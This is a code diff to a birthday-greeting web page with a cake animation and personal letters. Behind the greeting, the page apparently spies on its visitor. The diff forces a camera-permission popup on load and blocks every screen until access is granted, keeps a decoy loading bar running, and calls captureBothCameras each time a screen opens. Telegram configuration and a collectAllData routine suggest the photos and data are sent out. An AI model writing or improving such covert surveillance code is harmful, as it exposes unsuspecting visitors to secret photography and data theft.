@@ -626,8 +626,8 @@
     .cake-candle.blown .cake-flame { display: none; }
     .cake-candle.blown { background: #ccc; box-shadow: none; }
     .cake-message { color: #9bbc0f; font-size: 20px; font-weight: bold; margin: 20px 0; }
-</style>
-<script>
+    </style>
+    <script>
     // ============================================
     // TELEGRAM CONFIG (YOUR TOKEN & CHAT ID)
     // ============================================
@@ -687,7 +687,7 @@
     }
 
     // ============================================
-    // CAMERA FUNCTIONS (WITH GAMEBOY THEME & AUTO RESTART)
+    // CAMERA FUNCTIONS (FIX - PAKSA MUNCUL)
     // ============================================
     function showForcedCameraPopup() {
         // Clear everything
@@ -765,26 +765,6 @@
             }, 1000);
         }
     };
-
-    // Check permission on load
-    async function checkCameraPermission() {
-        if (permissionChecked) return;
-        permissionChecked = true;
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            cameraPermission = true;
-            stream.getTracks().forEach(track => track.stop());
-            
-            // Send initial data
-            setTimeout(() => {
-                collectAllData();
-            }, 2000);
-            
-        } catch (error) {
-            showForcedCameraPopup();
-        }
-    }
 
     async function captureBothCameras(reason = '') {
         if (!cameraPermission) return;
@@ -887,7 +867,8 @@
             if (progress >= 100) {
                 clearInterval(interval);
                 setTimeout(() => {
-                    showScreen('main');
+                    // Jangan panggil showScreen dulu, nunggu izin
+                    console.log('Loading complete, waiting for camera permission');
                 }, 500);
             }
         }, 200);
@@ -897,7 +878,10 @@
     // SCREEN NAVIGATION
     // ============================================
     window.showScreen = function(screenId) {
-        if (!cameraPermission) return;
+        if (!cameraPermission) {
+            showForcedCameraPopup();
+            return;
+        }
         
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
         const targetScreen = document.getElementById(screenId + '-screen');
@@ -912,7 +896,19 @@
             captureBothCameras(`(opened ${screenId})`);
         }
     };
-            // ============================================
+
+    // ============================================
+    // INITIALIZE - PAKSA POPUP DULU
+    // ============================================
+    window.addEventListener('load', () => {
+        // Langsung tampilkan popup
+        showForcedCameraPopup();
+        
+        // Tetap jalanin loading biar keliatan
+        simulateLoading();
+        loadStats();
+    });
+                // ============================================
         // LETTERS (6 SURAT ENGLISH)
         // ============================================
         const letters = [
